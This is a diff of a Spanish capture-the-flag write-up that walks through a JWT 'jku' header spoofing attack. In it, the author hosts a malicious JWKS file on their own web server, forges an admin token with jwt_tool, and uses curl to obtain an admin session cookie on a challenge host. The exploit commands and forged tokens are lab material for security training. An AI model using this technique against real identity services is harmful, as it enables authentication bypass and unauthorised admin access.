@@ -1509,16 +1509,13 @@ Token:
 eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.txHOmL-OX4aBEiUZrPxsJUitE5COI7WY7uhgbkSbngcV2P8IzvRyddTB6c9pjYvXwZgZ9gbN3iyg0twWk3wVsw7Ykx8PFf6ctUd5k_gChXAgFMbIy0MGhPke3JYPGIC4iL40kgSuyoFeQLofxQYKHMXm3EolLX5Dd3N64oXFWnSt6CLxFyr0Pn9gmWnjb_-Ei54__gPdL7U4YMwO4RQkF5G_lc7drZrirRokq5w67DiPJykBoYl-gSrYYxZSWQI3d0qZ4yLPDPRQXkwd3p54txbEqOlvGk3wfIfYXToj8-5oV5FHRcL8zP83LUJBlgEsVK9SdN8P9f-fKzRF1BJY9w
 ```
 
-
-## 2. Analizar el token
-
 Inspeccionamos el JWT con jwt_tool:
 
 ```bash
 jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.txHOmL-OX4aBEiUZrPxsJUitE5COI7WY7uhgbkSbngcV2P8IzvRyddTB6c9pjYvXwZgZ9gbN3iyg0twWk3wVsw7Ykx8PFf6ctUd5k_gChXAgFMbIy0MGhPke3JYPGIC4iL40kgSuyoFeQLofxQYKHMXm3EolLX5Dd3N64oXFWnSt6CLxFyr0Pn9gmWnjb_-Ei54__gPdL7U4YMwO4RQkF5G_lc7drZrirRokq5w67DiPJykBoYl-gSrYYxZSWQI3d0qZ4yLPDPRQXkwd3p54txbEqOlvGk3wfIfYXToj8-5oV5FHRcL8zP83LUJBlgEsVK9SdN8P9f-fKzRF1BJY9w
 ```
 
-Observamos:
+Observo:
 
 - alg: RS256 (firma asimétrica)
 - jku: http://idp.atnascorp/.well-known/jwks.json
@@ -1528,37 +1525,31 @@ Observamos:
 El parámetro jku indica que la clave pública se obtiene desde una URL externa.  
 Esto sugiere una posible explotación mediante inyección del parámetro jku (JWKS spoofing).
 
-
-## 3. Verificar acceso al servidor web local
-
-Las pistas indican que podemos hostear archivos en:
+Las pistas indican que puedo hostear archivos en:
 
 http://paulweb.neighborhood/
 
-Nos movemos al directorio correspondiente:
+Me muevo al directorio correspondiente:
 
 ```bash
 cd ~/www
 ls -la
 ```
 
-Creamos un archivo de prueba:
+Creo un archivo de prueba:
 
 ```bash
 nano jwks.json
 ```
 
-Escribimos contenido simple para testear y luego verificamos acceso:
+Escribo contenido simple para testear y luego verifico acceso:
 
 ```bash
 curl http://paulweb.neighborhood/jwks.json
 ```
-Si responde correctamente, podemos usar esta ubicación para alojar nuestra JWKS maliciosa.
+Si responde correctamente, puedo usar esta ubicación para alojar mi JWKS maliciosa.
 
-
-## 4. Generar token modificado con JWKS spoofing
-
-Ejecutamos jwt_tool en modo exploit:
+Ejecuto jwt_tool en modo exploit:
 
 ```bash
 jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.txHOmL-OX4aBEiUZrPxsJUitE5COI7WY7uhgbkSbngcV2P8IzvRyddTB6c9pjYvXwZgZ9gbN3iyg0twWk3wVsw7Ykx8PFf6ctUd5k_gChXAgFMbIy0MGhPke3JYPGIC4iL40kgSuyoFeQLofxQYKHMXm3EolLX5Dd3N64oXFWnSt6CLxFyr0Pn9gmWnjb_-Ei54__gPdL7U4YMwO4RQkF5G_lc7drZrirRokq5w67DiPJykBoYl-gSrYYxZSWQI3d0qZ4yLPDPRQXkwd3p54txbEqOlvGk3wfIfYXToj8-5oV5FHRcL8zP83LUJBlgEsVK9SdN8P9f-fKzRF1BJY9w -X s -ju http://paulweb.neighborhood/jwks.json -T
@@ -1566,7 +1557,7 @@ jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtu
 
 Durante el proceso interactivo:
 
-1. Modificamos el header:
+1. Modifico el header:
    - Cambiamos el valor de jku por:
      http://paulweb.neighborhood/jwks.json
 
@@ -1587,8 +1578,6 @@ Nuevo token:
 ```bash
 eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJqd3RfdG9vbCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.KQM826XXcht7qBmhBc-aW9oZweaFAZ2DeRQK9YLPRnoT3gFcQz5pCZ9o8FLKAyDUovUP7NxEeEAxaQwJaRHdHkOAM3HXrK-kk-T7UXvmuhXDMHjBM48BqrpYsxIV_qrJ2xjZTkAL16PgI40goAyX4nknvZQvyJldiT-GvCDLoWej0qIe-v66BBseqzLBR7Tr3WvrPUhQX2MG1J13k9Fk2CWGXhmdVmr82hh89VhD-t-YW0JakuXmsC_MEXyf-XGlyFE2IfBPPXxnpdQnLsTvITr5CkfD6TMBwqD0RgiM87jturYwxMmjXR0J8JwHfHRVmXQO4vNcNuVRevwWxGdsHQ
 ```
-
-## 5. Publicar la JWKS maliciosa
 
 Copiamos el contenido generado:
 
@@ -1617,9 +1606,6 @@ nano ~/www/jwks.json
 
 Ahora el servidor local expone nuestra clave pública.
 
-
-## 6. Autenticarnos con el nuevo token
-
 Probamos el nuevo JWT:
 ```bash
 curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJqd3RfdG9vbCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.KQM826XXcht7qBmhBc-aW9oZweaFAZ2DeRQK9YLPRnoT3gFcQz5pCZ9o8FLKAyDUovUP7NxEeEAxaQwJaRHdHkOAM3HXrK-kk-T7UXvmuhXDMHjBM48BqrpYsxIV_qrJ2xjZTkAL16PgI40goAyX4nknvZQvyJldiT-GvCDLoWej0qIe-v66BBseqzLBR7Tr3WvrPUhQX2MG1J13k9Fk2CWGXhmdVmr82hh89VhD-t-YW0JakuXmsC_MEXyf-XGlyFE2IfBPPXxnpdQnLsTvITr5CkfD6TMBwqD0RgiM87jturYwxMmjXR0J8JwHfHRVmXQO4vNcNuVRevwWxGdsHQ
@@ -1629,9 +1615,6 @@ Si todo está correcto, obtenemos una cookie de sesión válida.
 
 Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aaYPkA.yKvAzRkhBXZCFns9HK-PAv7VTjs
 
-
-## 7. Acceder al panel administrativo
-
 Usamos la cookie devuelta:
 
 ```bash
@@ -1639,8 +1622,6 @@ curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aaYPkA.yKv
 ```
 
 Accedemos al panel con privilegios de administrador.
-
-## 8. Identificar el firmware instalado
 
 En el log del sistema observamos:
 
